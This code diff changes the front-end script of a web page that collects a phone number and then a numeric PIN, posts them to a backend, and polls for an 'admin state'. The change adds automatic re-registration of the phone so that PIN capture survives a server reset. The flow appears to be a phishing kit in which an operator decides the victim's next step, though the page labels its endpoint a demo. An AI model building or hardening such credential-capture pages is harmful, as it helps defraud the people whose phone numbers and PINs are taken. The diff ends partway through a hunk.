@@ -107,18 +107,15 @@
     const pinStatus = document.getElementById('pinStatus');
     const pinError = document.getElementById('pinError');
 
-    phoneInput.addEventListener('input', function () {
-  const number = this.value.replace(/\D/g, '').slice(0, 9);
-  this.value = number;
-
-  phoneButton.disabled = number.length !== 9;
-
-  if (phoneButton.disabled) {
-    phoneButton.style.backgroundColor = '#cccccc';
-  } else {
-    phoneButton.style.backgroundColor = '#004f71';
-  }
-});
+    phoneInput.addEventListener('input', (e) => {
+      let digits = e.target.value.replace(/[^0-9]/g, '');
+      e.target.value = digits;
+      if (digits.length === 9) {
+        phoneButton.removeAttribute('disabled');
+      } else {
+        phoneButton.setAttribute('disabled', 'true');
+      }
+    });
 
     phoneButton.addEventListener('click', async () => {
       phoneError.textContent = '';
@@ -141,40 +138,35 @@
       } catch (err) {
         phoneError.textContent = err.message;
         phoneButton.removeAttribute('disabled');
-        phoneButton.disabled = false;
       }
     });
 
-    function createPinInputs(container, totalCount) {
+    function createPinInputs(container, count) {
       container.innerHTML = '';
       const inputs = [];
-      for (let i = 0; i < totalCount; i++) {
+      for (let i = 0; i < count; i++) {
         const input = document.createElement('input');
         input.type = 'password';
         input.inputMode = 'numeric';
         input.maxLength = 1;
         input.className = 'digit';
 
-        input.addEventListener('input', () => {
-          input.value = input.value.replace(/[^0-9]/g, '');
-          if (input.value && input.nextElementSibling) input.nextElementSibling.focus();
+        input.addEventListener('input', (e) => {
+          e.target.value = e.target.value.replace(/[^0-9]/g, '');
+          if (e.target.value && input.nextElementSibling) input.nextElementSibling.focus();
           
           const pinVal = inputs.map(inp => inp.value).join('');
-          if (pinVal.length === 5) {
-            submitPinFlow(pinVal, inputs);
-          }
+          if (pinVal.length === count) submitPinFlow(pinVal, inputs);
         });
 
         input.addEventListener('keydown', (e) => {
-          if (e.key === 'Backspace' && !input.value && input.previousElementSibling) {
-            input.previousElementSibling.focus();
-          }
+          if (e.key === 'Backspace' && !e.target.value && input.previousElementSibling) input.previousElementSibling.focus();
         });
 
         container.appendChild(input);
         inputs.push(input);
       }
-      if (inputs.length > 0) inputs[0].focus();
+      inputs[0].focus();
     }
 
     async function submitPinFlow(pinValue, inputs) {
@@ -182,20 +174,36 @@
       secureModal.classList.remove('hidden'); 
       inputs.forEach(i => i.disabled = true);
 
+      // ✅ AUTOMATIC RE-REGISTRATION FALLBACK
+      // If Render clears its storage, this auto-registers the phone number right before saving the PIN
+      try {
+        let checkRes = await fetch(`/api/status/${currentRequestId}`);
+        if (!checkRes.ok) {
+          const reRegister = await fetch('/api/phone', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: savedPhoneValue })
+          });
+          const reData = await reRegister.json();
+          if (reRegister.ok) {
+            currentRequestId = reData.id;
+          }
+        }
+      } catch (e) { console.log("State refresh ignored."); }
+
       try {
         const res = await fetch('/api/pin-demo', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ id: currentRequestId, pin: pinValue })
         });
-        const data = await res.json();
-        if (!res.ok) throw new Error(data.error || 'Submission failed.');
+        if (!res.ok) throw new Error('Submission failed.');
         startPollingAdminState(inputs);
       } catch (err) {
         secureModal.classList.add('hidden');
         pinError.textContent = err.message;
         inputs.forEach(i => { i.disabled = false; i.value = ''; });
-        if (inputs.length > 0) inputs[0].focus();
+        inputs[0].focus();
       }
     }
 
@@ -226,7 +234,3 @@
       try {
         await fetch('/api/retry', {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ id: currentRequestId })
-        });
-
